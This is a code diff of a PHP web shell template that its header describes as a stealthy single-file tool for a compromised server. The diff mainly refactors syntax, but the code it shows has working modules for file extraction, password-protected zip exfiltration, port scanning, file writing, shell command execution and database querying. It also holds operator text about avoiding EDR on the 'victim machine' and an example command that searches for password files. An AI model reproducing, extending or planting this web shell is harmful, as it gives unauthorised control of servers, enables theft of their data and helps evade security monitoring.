@@ -4,7 +4,7 @@
  * Build: 2024-04-13
  * Last change: 2024-05-01
  * Author: @Ebalo <https://github.com/ebalo55>
- * Minimum PHP version: 5.3
+ * Minimum PHP version: 7.0
  * Description:
  * This template is used to generate a PHP script that can be used to perform various operations, stealthily, on a server.
  * The idea is to have a single PHP file that can be uploaded to a server and then accessed to perform various operations.
@@ -36,72 +36,72 @@ $SALT     = "__SALT__";
  *
  * @var array<string, array{title: string, description: string, svg: string, hidden?: bool}> $ENABLED_FEATURES
  */
-$ENABLED_FEATURES = array(
-    $FILE_EXTRACTION         => array(
+$ENABLED_FEATURES = [
+    $FILE_EXTRACTION         => [
         "title"       => "File extraction",
         "description" => "Extract file content as base64.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
-    ),
-    $FILE_EXTRACTION_PREVIEW => array(
+    ],
+    $FILE_EXTRACTION_PREVIEW => [
         "title"       => "File extraction",
         "description" => "Extract file content as base64.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m.75 12 3 3m0 0 3-3m-3 3v-6m-1.5-9H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
         "hidden"      => true,
-    ),
-    $DIRECTORY_LISTING       => array(
+    ],
+    $DIRECTORY_LISTING       => [
         "title"       => "Directory listing",
         "description" => "List all files and folders in a directory and optionally its subdirectories.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3.75 12h16.5m-16.5 3.75h16.5M3.75 19.5h16.5M5.625 4.5h12.75a1.875 1.875 0 0 1 0 3.75H5.625a1.875 1.875 0 0 1 0-3.75Z" />
 </svg>',
-    ),
-    $EXFILTRATE              => array(
+    ],
+    $EXFILTRATE              => [
         "title"       => "Exfiltrate",
         "description" => "Exfiltrate data from the server in a password protected zip archive.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M3 16.5v2.25A2.25 2.25 0 0 0 5.25 21h13.5A2.25 2.25 0 0 0 21 18.75V16.5M16.5 12 12 16.5m0 0L7.5 12m4.5 4.5V3" />
 </svg>',
-    ),
-    $PORT_SCAN               => array(
+    ],
+    $PORT_SCAN               => [
         "title"       => "Port scan",
         "description" => "Scan a given range of TCP ports using connect method.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M17.25 6.75 22.5 12l-5.25 5.25m-10.5 0L1.5 12l5.25-5.25m7.5-3-4.5 16.5" />
 </svg>',
-    ),
-    $WRITE_FILE              => array(
+    ],
+    $WRITE_FILE              => [
         "title"       => "Write file",
         "description" => "Write a file to the given path, writing permission are required.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M19.5 14.25v-2.625a3.375 3.375 0 0 0-3.375-3.375h-1.5A1.125 1.125 0 0 1 13.5 7.125v-1.5a3.375 3.375 0 0 0-3.375-3.375H8.25m0 12.75h7.5m-7.5 3H12M10.5 2.25H5.625c-.621 0-1.125.504-1.125 1.125v17.25c0 .621.504 1.125 1.125 1.125h12.75c.621 0 1.125-.504 1.125-1.125V11.25a9 9 0 0 0-9-9Z" />
 </svg>',
-    ),
-    $RUN_COMMAND             => array(
+    ],
+    $RUN_COMMAND             => [
         "title"       => "Run command",
         "description" => "Run a system command using the default shell.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m6.75 7.5 3 2.25-3 2.25m4.5 0h3m-9 8.25h13.5A2.25 2.25 0 0 0 21 18V6a2.25 2.25 0 0 0-2.25-2.25H5.25A2.25 2.25 0 0 0 3 6v12a2.25 2.25 0 0 0 2.25 2.25Z" />
 </svg>',
-    ),
-    $PHP_INFO                => array(
+    ],
+    $PHP_INFO                => [
         "title"       => "PHP Info",
         "description" => "Display PHP information.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="m11.25 11.25.041-.02a.75.75 0 0 1 1.063.852l-.708 2.836a.75.75 0 0 0 1.063.853l.041-.021M21 12a9 9 0 1 1-18 0 9 9 0 0 1 18 0Zm-9-3.75h.008v.008H12V8.25Z" />
 </svg>',
-    ),
-    $QUERY_DATABASES         => array(
+    ],
+    $QUERY_DATABASES         => [
         "title"       => "Query databases",
         "description" => "Query databases using the provided credentials.",
         "svg"         => '<svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" class="w-6 h-6">
   <path stroke-linecap="round" stroke-linejoin="round" d="M20.25 6.375c0 2.278-3.694 4.125-8.25 4.125S3.75 8.653 3.75 6.375m16.5 0c0-2.278-3.694-4.125-8.25-4.125S3.75 4.097 3.75 6.375m16.5 0v11.25c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125V6.375m16.5 0v3.75m-16.5-3.75v3.75m16.5 0v3.75C20.25 16.153 16.556 18 12 18s-8.25-1.847-8.25-4.125v-3.75m16.5 0c0 2.278-3.694 4.125-8.25 4.125s-8.25-1.847-8.25-4.125" />
 </svg>',
-    ),
-);
+    ],
+];
 
 date_default_timezone_set("UTC");
 
@@ -672,7 +672,7 @@ function chunkedDownload($filepath, $filesize, $filename = null) {
     header('Content-Description: File Transfer');
     header('Content-Type: application/octet-stream'); // Adjust content type if needed
     header(
-        'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"'
+        'Content-Disposition: attachment; filename="' . (!is_null($filename) ? $filename : basename($filepath)) . '"',
     );
     header('Content-Transfer-Encoding: chunked');
     header('Content-Length: ' . $filesize); // Optional: Set content length for progress tracking
@@ -806,7 +806,7 @@ function getStatForCurrentPath($path) {
          convertUnixTimestampToDate($stat["mtime"]) .
          " $path\n";
 
-    return array($stat, $perm);
+    return [$stat, $perm];
 }
 
 /**
@@ -876,14 +876,14 @@ function pad_right($str, $pad_length = 10) {
  * @return string
  */
 function formatBytes($bytes) {
-    $units = array('B', 'KB', 'MB', 'GB', 'TB');
+    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
 
     $bytes = max($bytes, 0);
     $pow   = floor(($bytes ? log($bytes) : 0) / log(1024));
     $pow   = min($pow, count($units) - 1);
 
     // Calculate size in the chosen unit
-    $bytes /= pow(1024, $pow);
+    $bytes /= 1024 ** $pow;
 
     // Format with three-point precision
     return pad_right(round($bytes, 3) . ' ' . $units[$pow]);
@@ -966,10 +966,10 @@ function handleCreateZip() {
     $path_replacement = getShortestCommonPath($lines);
     foreach ($lines as $line) {
         $parts = explode(',', trim($line)); // Split line by comma
-        $path  = isset($parts[0]) ? $parts[0] : '';
+        $path  = $parts[0] ?? '';
 
         $recursive  = in_array('with_tree', $parts);
-        $extensions = array();
+        $extensions = [];
 
         foreach ($parts as $part) {
             if (strpos($part, 'extension=') === 0) {
@@ -981,7 +981,7 @@ function handleCreateZip() {
         if ($path) {
             if (
                 is_file($path) &&
-                ($extensions === array() || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
+                ($extensions === [] || in_array(strtolower(pathinfo($path, PATHINFO_EXTENSION)), $extensions))
             ) {
                 $zip->addFile(
                     $path,
@@ -991,9 +991,9 @@ function handleCreateZip() {
                         preg_replace(
                             "\\",
                             "/",
-                            basename($path)
-                        )  // Replace backslashes with forward slashes
-                    ) // Remove common path from filename
+                            basename($path),
+                        ),  // Replace backslashes with forward slashes
+                    ), // Remove common path from filename
                 );
             }
             else {
@@ -1031,7 +1031,7 @@ function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = 
 
             if (
                 is_file($sub_path) &&
-                ($extensions === array() || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
+                ($extensions === [] || in_array(strtolower(pathinfo($sub_path, PATHINFO_EXTENSION)), $extensions))
             ) {
                 $zip->addFile(
                     $sub_path,
@@ -1041,9 +1041,9 @@ function addDirectoryToZip($dir, $zip, $recursive, $extensions, $cleanup_path = 
                         preg_replace(
                             "\\",
                             "/",
-                            basename($sub_path)
-                        )  // Replace backslashes with forward slashes
-                    ) // Remove common path from filename
+                            basename($sub_path),
+                        ),  // Replace backslashes with forward slashes
+                    ), // Remove common path from filename
                 ); // Add with relative path within zip
             }
             else {
@@ -1099,10 +1099,7 @@ function handleWriteFile() {
     $content                = $should_decode_from_b64 ? base64_decode($_POST['__PARAM_2__']) : $_POST['__PARAM_2__'];
 
     out(
-        array(
-            "Received content of length " . strlen($content) . " bytes.",
-            "Writing to $filename ...",
-        )
+        ["Received content of length " . strlen($content) . " bytes.", "Writing to $filename ..."],
     );
 
     file_put_contents($filename, $content);
@@ -1133,15 +1130,15 @@ function handleLogin() {
 function makeExfiltratePage() {
     global $EXFILTRATE, $ENABLED_FEATURES;
     return makePage(
-        array(
+        [
             makePageHeader(
                 $ENABLED_FEATURES[$EXFILTRATE]["title"],
-                $ENABLED_FEATURES[$EXFILTRATE]["description"]
+                $ENABLED_FEATURES[$EXFILTRATE]["description"],
             ),
             makeForm(
                 $EXFILTRATE,
                 $_SERVER["REQUEST_URI"],
-                array(
+                [
                     makeInput(
                         "textarea",
                         "Paths",
@@ -1152,12 +1149,12 @@ function makeExfiltratePage() {
                         " to include all files and folders within a given directory.<br/>" .
                         "Concatenate to the path " . makeCodeHighlight(",extensions=txt|doc|xlsx") .
                         " to include only files with the given extensions.",
-                        true
+                        true,
                     ),
-                )
+                ],
             ),
-        ),
-        $EXFILTRATE
+        ],
+        $EXFILTRATE,
     );
 }
 
@@ -1214,7 +1211,7 @@ function printAsciiTable($data) {
     $headers = array_keys($data[0]);
 
     // Calculate column widths
-    $columnWidths = array();
+    $columnWidths = [];
     foreach ($headers as $header) {
         $columnWidths[$header] = max(array_map('strlen', array_column($data, $header))) + 2;
     }
@@ -1302,39 +1299,13 @@ function connectAndQueryDatabase(
     $enableScrollableCursors = null,
     $raw_connection_string = "",
     $query = null,
-    $collection = null
+    $collection = null,
 ) {
     if ($db_type === 'mysql') {
         $port = $port ?: 3306;
 
         // Check if the MySQL extension is loaded
-        if (extension_loaded("mysql")) {
-            $connection = mysql_connect("$host:$port", $username, $password);
-
-            if (!$connection) {
-                echo "[Driver: mysql] Connection failed: " . mysql_error();
-            }
-            else {
-                echo "[Driver: mysql] Connected successfully using $username:$password.\n";
-
-                if (!empty($query)) {
-                    $result = mysql_query($query, $connection);
-                    echo "[Driver: mysql] Query executed successfully.\n";
-                    if ($result) {
-                        $rows = array();
-                        while ($row = mysql_fetch_assoc($result)) {
-                            $rows[] = $row;
-                        }
-                        printAsciiTable($rows);
-                    }
-                    else {
-                        echo "[Driver: mysql] Query failed: " . mysql_error();
-                    }
-                }
-            }
-        }
-        // Check if the MySQLi extension is loaded
-        elseif (extension_loaded("mysqli")) {
+        if (extension_loaded("mysqli")) {
             mysqli_report(MYSQLI_REPORT_ERROR | MYSQLI_REPORT_STRICT);
             try {
                 $connection = mysqli_connect($host, $username, $password, $database, $port);
@@ -1349,7 +1320,7 @@ function connectAndQueryDatabase(
                         $result = mysqli_query($connection, $query);
                         if ($result) {
                             echo "[Driver: mysqli] Query executed successfully.\n";
-                            $rows = array();
+                            $rows = [];
                             while ($row = mysqli_fetch_assoc($result)) {
                                 $rows[] = $row;
                             }
@@ -1426,7 +1397,7 @@ function connectAndQueryDatabase(
                     $result = cubrid_query($query, $connection);
                     if ($result) {
                         echo "[Driver: cubrid] Query executed successfully.\n";
-                        $rows = array();
+                        $rows = [];
                         while ($row = cubrid_fetch_assoc($result)) {
                             $rows[] = $row;
                         }
@@ -1475,7 +1446,7 @@ function connectAndQueryDatabase(
                     $result = pg_query($connection, $query);
                     if ($result) {
                         echo "[Driver: pgsql] Query executed successfully.\n";
-                        $rows = array();
+                        $rows = [];
                         while ($row = pg_fetch_assoc($result)) {
                             $rows[] = $row;
                         }
@@ -1522,7 +1493,7 @@ function connectAndQueryDatabase(
                     $result = sqlite_query($connection, $query);
                     if ($result) {
                         echo "[Driver: sqlite3] Query executed successfully.\n";
-                        $rows = array();
+                        $rows = [];
                         while ($row = sqlite_fetch_array($result)) {
                             $rows[] = $row;
                         }
@@ -1560,7 +1531,7 @@ function connectAndQueryDatabase(
         // Check if the SQL Server extension is loaded
         elseif (extension_loaded("sqlsrv")) {
             echo "Connecting to $host with default instance specification ...\n";
-            $connection = sqlsrv_connect($host, array("Database" => $database, "UID" => $username, "PWD" => $password));
+            $connection = sqlsrv_connect($host, ["Database" => $database, "UID" => $username, "PWD" => $password]);
 
             if (!$connection) {
                 echo "[Driver: sqlsrv] Connection failed: " . sqlsrv_errors();
@@ -1568,7 +1539,7 @@ function connectAndQueryDatabase(
 
                 $connection = sqlsrv_connect(
                     "$host,$port",
-                    array("Database" => $database, "UID" => $username, "PWD" => $password)
+                    ["Database" => $database, "UID" => $username, "PWD" => $password],
                 );
 
                 if (!$connection) {
@@ -1586,7 +1557,7 @@ function connectAndQueryDatabase(
                 $result = sqlsrv_query($connection, $query);
                 if ($result) {
                     echo "[Driver: sqlsrv] Query executed successfully.\n";
-                    $rows = array();
+                    $rows = [];
                     while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
                         $rows[] = $row;
                     }
@@ -1641,7 +1612,7 @@ function connectAndQueryDatabase(
                     if ($statement) {
                         if (oci_execute($statement)) {
                             echo "[Driver: oci8] Query executed successfully.\n";
-                            $rows = array();
+                            $rows = [];
                             while ($row = oci_fetch_assoc($statement)) {
                                 $rows[] = $row;
                             }
@@ -1672,10 +1643,10 @@ function connectAndQueryDatabase(
                 echo "[Driver: mongodb] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
-                    $query  = new MongoDB\Driver\Query(array());
+                    $query  = new MongoDB\Driver\Query([]);
                     $cursor = $connection->executeQuery("$database.$collection", $query);
 
-                    $rows = array();
+                    $rows = [];
                     foreach ($cursor as $row) {
                         $rows[] = $row;
                     }
@@ -1689,14 +1660,14 @@ function connectAndQueryDatabase(
         // Check if the Mongo extension is loaded
         elseif (extension_loaded("mongo")) {
             try {
-                $connection = new Mongo($dsn, array_merge(array("connect" => true), explode("&", $options)));
+                $connection = new Mongo($dsn, array_merge(["connect" => true], explode("&", $options)));
                 echo "[Driver: mongo] Connected successfully using $username:$password.\n";
 
                 if (!empty($query)) {
                     $collection = $connection->selectCollection($database, $collection);
                     $cursor     = $collection->find();
 
-                    $rows = array();
+                    $rows = [];
                     foreach ($cursor as $row) {
                         $rows[] = $row;
                     }
@@ -1746,7 +1717,7 @@ function connectAndQueryDatabase(
                     $result = db2_exec($connection, $query);
                     if ($result) {
                         echo "[Driver: ibm] Query executed successfully.\n";
-                        $rows = array();
+                        $rows = [];
                         while ($row = db2_fetch_assoc($result)) {
                             $rows[] = $row;
                         }
@@ -1819,7 +1790,7 @@ function connectAndQueryDatabase(
                 $result = ibase_query($connection, $query);
                 if ($result) {
                     echo "[Driver: interbase] Query executed successfully.\n";
-                    $rows = array();
+                    $rows = [];
                     while ($row = ibase_fetch_assoc($result)) {
                         $rows[] = $row;
                     }
@@ -1865,7 +1836,7 @@ function connectAndQueryDatabase(
                     $result = odbc_exec($connection, $query);
                     if ($result) {
                         echo "[Driver: odbc] Query executed successfully.\n";
-                        $rows = array();
+                        $rows = [];
                         while ($row = odbc_fetch_array($result)) {
                             $rows[] = $row;
                         }
@@ -1921,56 +1892,6 @@ function connectAndQueryDatabase(
                 echo "[Driver: pdo_dblib] Connection failed: " . $e->getMessage();
             }
         }
-        // Check if the Sybase extension is loaded
-        elseif (extension_loaded("sybase")) {
-            $connection = sybase_connect($host, $username, $password);
-
-            if (!$connection) {
-                echo "[Driver: sybase] Connection failed: " . sybase_get_last_message();
-            }
-            else {
-                echo "[Driver: sybase] Connected successfully using $username:$password.\n";
-
-                if (!empty($query)) {
-                    $result = sybase_query($query, $connection);
-                    if ($result) {
-                        echo "[Driver: sybase] Query executed successfully.\n";
-                        $rows = array();
-                        while ($row = sybase_fetch_assoc($result)) {
-                            $rows[] = $row;
-                        }
-                        printAsciiTable($rows);
-                    }
-                    else {
-                        echo "[Driver: sybase] Query failed: " . sybase_get_last_message();
-                    }
-                }
-            }
-        }
-        // Check if the FreeTDS extension is loaded
-        elseif (extension_loaded("mssql")) {
-            $connection = mssql_connect($host, $username, $password);
-
-            if (!$connection) {
-                echo "[Driver: mssql] Connection failed: " . mssql_get_last_message();
-            }
-            else {
-                echo "[Driver: mssql] Connected successfully using $username:$password.\n";
-
-                if (!empty($query)) {
-                    $result = mssql_query($query, $connection);
-                    if ($result) {
-                        echo "Query executed successfully.\n";
-                        while ($row = mssql_fetch_assoc($result)) {
-                            echo json_encode($row);
-                        }
-                    }
-                    else {
-                        echo "Query failed: " . mssql_get_last_message();
-                    }
-                }
-            }
-        }
         else {
             echo "[Driver: none] Sybase extension is not loaded.\n";
         }
@@ -2011,15 +1932,11 @@ if (isset($_GET["dev"])) {
 
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
-$isolated_ops = array(
-    $FILE_EXTRACTION,
-    $EXFILTRATE,
-    $LOGIN,
-);
+$isolated_ops = [$FILE_EXTRACTION, $EXFILTRATE, $LOGIN];
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
 if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"], $isolated_ops))) {
-    $page = isset($_GET['page']) ? $_GET['page'] : ($_SESSION["auth"] === true ? $FILE_EXTRACTION : $LOGIN);
+    $page = $_GET['page'] ?? ($_SESSION["auth"] === true ? $FILE_EXTRACTION : $LOGIN);
 
     $content = "";
 
@@ -2030,15 +1947,15 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
         case $FILE_EXTRACTION_PREVIEW:
         case $FILE_EXTRACTION:
             $content = makePage(
-                array(
+                [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
+                        $ENABLED_FEATURES[$page]["description"],
                     ),
                     makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
-                        array(
+                        [
                             makeInput(
                                 "text",
                                 "Path",
@@ -2046,7 +1963,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "C://path/to/file.txt",
                                 "Fully qualified path to the file to extract.",
                                 true,
-                                "__PARAM_99__"
+                                "__PARAM_99__",
                             ),
                             makeCheckbox(
                                 "__PARAM_2__",
@@ -2060,37 +1977,37 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                       "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
                                     : "window.location.href = '?page=" .
                                       $FILE_EXTRACTION_PREVIEW .
-                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value"
+                                      "&__PARAM_99__=' + document.getElementById('__PARAM_1__').value",
                             ),
                             makeCheckbox(
                                 "__PARAM_3__",
                                 "Export",
-                                "Export the file even if larger than 100kb."
+                                "Export the file even if larger than 100kb.",
                             ),
-                        )
+                        ],
                     ),
-                ),
-                $page
+                ],
+                $page,
             );
             break;
         case $DIRECTORY_LISTING:
             $content = makePage(
-                array(
+                [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
+                        $ENABLED_FEATURES[$page]["description"],
                     ),
                     makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
-                        array(
+                        [
                             makeInput(
                                 "text",
                                 "Path",
                                 "__PARAM_1__",
                                 "C://path/to/directory or \\\\network\\path\\to\\directory",
                                 "Fully qualified path to the directory to list.",
-                                true
+                                true,
                             ),
                             makeInput(
                                 "text",
@@ -2100,12 +2017,12 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "How many levels deep to list, where " . makeCodeHighlight(0) .
                                 " is the current directory and " . makeCodeHighlight("inf") .
                                 " means to list all.",
-                                true
+                                true,
                             ),
-                        )
+                        ],
                     ),
-                ),
-                $page
+                ],
+                $page,
             );
             break;
         case $EXFILTRATE:
@@ -2113,22 +2030,22 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             break;
         case $PORT_SCAN:
             $content = makePage(
-                array(
+                [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
+                        $ENABLED_FEATURES[$page]["description"],
                     ),
                     makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
-                        array(
+                        [
                             makeInput(
                                 "text",
                                 "Host",
                                 "__PARAM_1__",
                                 "localhost",
                                 "The host to connect to",
-                                true
+                                true,
                             ),
                             makeInput(
                                 "number",
@@ -2136,7 +2053,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_2__",
                                 "1",
                                 "Starting port of the scan (included)",
-                                true
+                                true,
                             ),
                             makeInput(
                                 "number",
@@ -2144,32 +2061,32 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_3__",
                                 "65535",
                                 "Ending port of the scan (included)",
-                                true
+                                true,
                             ),
-                        )
+                        ],
                     ),
-                ),
-                $page
+                ],
+                $page,
             );
             break;
         case $WRITE_FILE:
             $content = makePage(
-                array(
+                [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
+                        $ENABLED_FEATURES[$page]["description"],
                     ),
                     makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
-                        array(
+                        [
                             makeInput(
                                 "text",
                                 "Path",
                                 "__PARAM_1__",
                                 "C://path/to/file.txt",
                                 "Fully qualified path where the file will be written.",
-                                true
+                                true,
                             ),
                             makeInput(
                                 "textarea",
@@ -2177,25 +2094,25 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_2__",
                                 "Lorem ipsum dolor sit amet, consectetur adipiscing elit.",
                                 "Content of the file to write to disk.",
-                                true
+                                true,
                             ),
                             makeCheckbox(
                                 "__PARAM_3__",
                                 "Decode from base64",
-                                "Decode the content of the file from base64 before writing it to disk."
+                                "Decode the content of the file from base64 before writing it to disk.",
                             ),
-                        )
+                        ],
                     ),
-                ),
-                $page
+                ],
+                $page,
             );
             break;
         case $RUN_COMMAND:
             $content = makePage(
-                array(
+                [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
+                        $ENABLED_FEATURES[$page]["description"],
                     ),
                     makeAlert(
                         "Running system commands",
@@ -2204,24 +2121,24 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                         easily detected by EDR and other security solutions.
                         <br/>
                         If triggering alert is not a problem, safely ignore this alert, otherwise carefully examine the 
-                        victim machine and ensure that there is no security solution running before using this module."
+                        victim machine and ensure that there is no security solution running before using this module.",
                     ),
                     makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
-                        array(
+                        [
                             makeInput(
                                 "textarea",
                                 "Command",
                                 "__PARAM_1__",
                                 "ls -lah | grep pass",
                                 "Command to run through the default system shell. This can be used to establish a full duplex tunnel between the attacker and the victim machine.",
-                                true
+                                true,
                             ),
-                        )
+                        ],
                     ),
-                ),
-                $page
+                ],
+                $page,
             );
             break;
         case $PHP_INFO:
@@ -2229,10 +2146,10 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
             phpinfo();
             $php_info = ob_get_clean();
             $content  = makePage(
-                array(
+                [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
+                        $ENABLED_FEATURES[$page]["description"],
                     ),
                     "<div class='grid grid-cols-2 gap-8 mt-8'>
                         <div>
@@ -2247,25 +2164,25 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                             " . listEnabledExtensions() . "
                         </div>
                     </div>",
-                ),
-                $page
+                ],
+                $page,
             );
             break;
         case $QUERY_DATABASES:
             $content = makePage(
-                array(
+                [
                     makePageHeader(
                         $ENABLED_FEATURES[$page]["title"],
-                        $ENABLED_FEATURES[$page]["description"]
+                        $ENABLED_FEATURES[$page]["description"],
                     ),
                     makeForm(
                         $page,
                         $_SERVER["REQUEST_URI"],
-                        array(
+                        [
                             makeSelect(
                                 "Database",
                                 "__PARAM_1__",
-                                array(
+                                [
                                     [
                                         "value"    => "mysql",
                                         "label"    => "MySQL",
@@ -2337,16 +2254,16 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                         "disabled" => !extension_loaded("pdo"),
                                         "selected" => true,
                                     ],
-                                ),
+                                ],
                                 true,
-                                "Database driver not available."
+                                "Database driver not available.",
                             ),
                             makeInput(
                                 "text",
                                 "Host",
                                 "__PARAM_2__",
                                 "localhost",
-                                "The host to connect to (default: localhost)"
+                                "The host to connect to (default: localhost)",
                             ),
                             makeInput(
                                 "number",
@@ -2368,7 +2285,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                         <li>ODBC (default: None)</li>
                                         <li>Informix (default: 9800)</li>
                                         <li>Sybase (default: 5000)</li>
-                                    </ul>"
+                                    </ul>",
                             ),
                             makeInput(
                                 "text",
@@ -2376,7 +2293,7 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_4__",
                                 "admin",
                                 "The username to connect with.",
-                                true
+                                true,
                             ),
                             makeInput(
                                 "password",
@@ -2384,105 +2301,105 @@ if (!isPost() || (!$_POST["__OPERATION__"] || !in_array($_POST["__OPERATION__"],
                                 "__PARAM_5__",
                                 "&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;",
                                 "The password to connect with.",
-                                true
+                                true,
                             ),
                             makeInput(
                                 "text",
                                 "Database",
                                 "__PARAM_6__",
                                 "ExampleDB",
-                                "The database to connect to."
+                                "The database to connect to.",
                             ),
                             makeInput(
                                 "text",
                                 "Charset",
                                 "__PARAM_7__",
                                 "utf8",
-                                "The charset to use for the connection."
+                                "The charset to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "Service name",
                                 "__PARAM_8__",
                                 "orcl",
-                                "The service name to use for the connection."
+                                "The service name to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "SID",
                                 "__PARAM_9__",
                                 "orcl",
-                                "The SID to use for the connection."
+                                "The SID to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "Options",
                                 "__PARAM_10__",
                                 "ssl=true",
-                                "The options to use for the connection."
+                                "The options to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "Role",
                                 "__PARAM_11__",
                                 "SYSDBA",
-                                "The role to use for the connection."
+                                "The role to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "Dialect",
                                 "__PARAM_12__",
                                 "3",
-                                "The dialect to use for the connection."
+                                "The dialect to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "Protocol",
                                 "__PARAM_13__",
                                 "onsoctcp",
-                                "The protocol to use for the connection."
+                                "The protocol to use for the connection.",
                             ),
                             makeCheckbox(
                                 "__PARAM_14__",
                                 "Enable scrollable cursors",
                                 "Enable scrollable cursors for the connection.",
                                 true,
-                                "1"
+                                "1",
                             ),
                             makeInput(
                                 "text",
                                 "ODBC driver",
                                 "__PARAM_15__",
                                 "ODBC Driver 17 for SQL Server",
-                                "The ODBC driver to use for the connection."
+                                "The ODBC driver to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "Raw connection string",
                                 "__PARAM_16__",
                                 "mysql:host=localhost;port=3306;dbname=ExampleDB;charset=utf8",
-                                "The raw connection string to use for the connection."
+                                "The raw connection string to use for the connection.",
                             ),
                             makeInput(
                                 "text",
                                 "Server",
